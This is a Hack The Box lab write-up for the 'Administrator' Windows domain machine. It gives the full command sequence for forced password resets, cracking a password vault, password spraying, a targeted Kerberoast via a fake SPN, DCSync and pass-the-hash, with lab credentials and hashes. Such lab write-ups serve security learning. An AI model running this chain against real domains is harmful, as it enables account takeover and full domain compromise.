# Administrator HTB – Writeup

## We start with credentials

Started with an nmap scan:

```bash
sudo nmap -sV 10.129.81.124
```

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-14 00:14:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

We collected BloodHound data:

```bash
bloodhound-python -u Olivia -p 'ichliebedich' -d administrator.htb -ns 10.129.81.124 -c all --zip
```

From BloodHound we see that Olivia has **GenericAll** over Michael, and Michael has **ForceChangePassword** over Benjamin.

We reset Michael's password with bloodyAD:

```bash
bloodyAD --host 10.129.81.124 -d administrator.htb -u Olivia -p 'ichliebedich' set password Michael 'Password123!'
```

We verify access:

```bash
nxc smb 10.129.81.124 -u Michael -p 'Password123!'
```

```
SMB  10.129.81.124  445  DC  [+] administrator.htb\Michael:Password123!
```

Then we use Michael's permissions to change Benjamin's password:

```bash
bloodyAD --host 10.129.81.124 -d administrator.htb -u Michael -p 'Password123!' set password Benjamin 'Password123!'
```

Let's connect via FTP using Benjamin's credentials:

```bash
ftp 10.129.81.124
```

We find a file `Backup.psafe3` and download it with `get`. This is a Password Safe v3 database (`PWS3` signature).

## Cracking the master password

```bash
pwsafe2john Backup.psafe3 > psafe.hash
john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
```

Result: `tekieromucho`

## Opening the vault

```bash
pwsafe Backup.psafe3
```

(GUI tool — entered `tekieromucho` as the master password)

Found 3 entries:

- Alexander Smith [alexander]
- Emily Rodriguez [emily]
- Emma Johnson [emma]

Copied each password via double-click (clipboard) and recovered:

- `alexander` : `UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
- `emily` : `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
- `emma` : `WwANQWnmJnGV07WQN8bMS7FMAbjNur`

We made a user list and a password list and sprayed them against the DC:

```bash
nxc smb 10.129.81.124 -u users.txt -p passwords.txt
```

```
SMB  10.129.81.124  445  DC  [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

We connected via evil-winrm and found the flag on Emily's Desktop:

```bash
evil-winrm -i 10.129.81.124 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

## Abusing GenericWrite on Ethan

Checking BloodHound data, Emily has **GenericWrite** over Ethan, and Ethan has **GetChanges** (in a filtered set) on Administrator (potential DCSync).

Let's take over Ethan's account by abusing GenericWrite and performing a targeted Kerberoast.

We set a fake SPN:

```bash
bloodyAD --host 10.129.81.124 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object Ethan servicePrincipalName -v 'fake/whatever'
```

```
[+] Ethan's servicePrincipalName has been updated
```

Then we performed a targeted Kerberoast on the fake SPN:

```bash
GetUserSPNs.py administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.81.124 -request
```

We retrieved Ethan's hash, saved it, and cracked it with hashcat:

```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

We obtained the following credential: `limpbizkit`

## DCSync with Ethan's credentials

```bash
secretsdump.py administrator.htb/ethan:'limpbizkit'@10.129.81.124 -just-dc-user Administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

We logged in via evil-winrm and retrieved the flag on Administrator's Desktop:

```bash
evil-winrm -i 10.129.81.124 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```
